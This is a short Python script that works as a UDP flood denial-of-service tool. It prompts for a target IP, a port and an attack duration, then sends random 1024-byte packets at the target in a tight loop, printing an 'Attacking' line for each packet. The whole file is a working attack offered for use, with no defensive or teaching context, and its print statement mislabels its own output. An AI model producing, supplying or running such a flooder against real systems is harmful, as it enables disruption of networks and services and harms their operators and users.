import time
import socket
import random
import sys



def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("Attacking %s sent packages %s at the port %s "%(sent, victim, vport))

def main():
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    attack_dur = int(input("Attack Duration (seconds): "))
    flood(target_ip,target_port, int(attack_dur))

if __name__ == '__main__':
    main()